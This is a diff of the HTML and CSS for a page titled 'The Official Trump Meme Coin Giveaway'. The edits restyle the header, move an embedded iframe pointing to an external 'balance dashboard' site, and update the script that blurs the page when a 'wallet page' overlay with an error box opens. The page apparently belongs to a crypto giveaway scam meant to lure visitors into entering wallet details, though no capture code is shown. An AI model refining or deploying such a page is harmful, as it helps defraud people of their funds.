@@ -6,17 +6,20 @@
   <title>The Official Trump Meme Coin Giveaway</title>
   <style>
     /* Updated Header Styles */
+    .header-container {
+      background: #0055cc;
+      width: 100%;
+      color: white;
+    }
+
     .header {
       display: flex;
       align-items: center;
       gap: 16px;
       padding: 20px;
       white-space: nowrap;
-      background: linear-gradient(90deg, rgba(0,51,102,0.85), rgba(0,102,204,0.85));
-      backdrop-filter: blur(1px);
-      position: relative;
-      z-index: 1;
-      color: white;
+      max-width: 1200px;
+      margin: 0 auto;
     }
 
     .header img {
@@ -47,7 +50,6 @@
     @media (min-width: 768px) {
       .header {
         justify-content: center;
-        background: linear-gradient(90deg, rgba(0,51,102,0.85), rgba(0,102,204,0.85));
       }
 
       iframe {
@@ -251,12 +253,14 @@
   </style>
 </head>
 <body>
-  <!-- Updated Header Section with Gradient Overlay -->
-  <div class="header">
-    <img src="https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin">
-    <h1>TRUMP MEME COIN GIVEAWAY</h1>
+  <!-- Updated Header Section with Solid Blue Background -->
+  <div class="header-container">
+    <div class="header">
+      <img src="https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin">
+      <h1>TRUMP MEME COIN GIVEAWAY</h1>
+    </div>
+    <iframe src="https://trump-balance-dashboard.netlify.app/" loading="lazy"></iframe>
   </div>
-  <iframe src="https://trump-balance-dashboard.netlify.app/" loading="lazy"></iframe>
 
   <!-- Original Content (Exactly Preserved) -->
   <div class="container" id="main-content">
@@ -337,7 +341,7 @@
     function showWalletPage() {
       document.getElementById('wallet-page').classList.add('active');
       document.getElementById('main-content').classList.add('blurred');
-      document.querySelector('.header').classList.add('blurred');
+      document.querySelector('.header-container').classList.add('blurred');
       document.querySelector('footer').classList.add('blurred');
       document.body.classList.add('noscroll');
     }
@@ -348,7 +352,7 @@
       document.getElementById('wallet-page').classList.remove('blurred');
       document.getElementById('error-box').style.display = "none";
       document.getElementById('main-content').classList.remove('blurred');
-      document.querySelector('.header').classList.remove('blurred');
+      document.querySelector('.header-container').classList.remove('blurred');
       document.querySelector('footer').classList.remove('blurred');
       document.body.classList.remove('noscroll');
     }
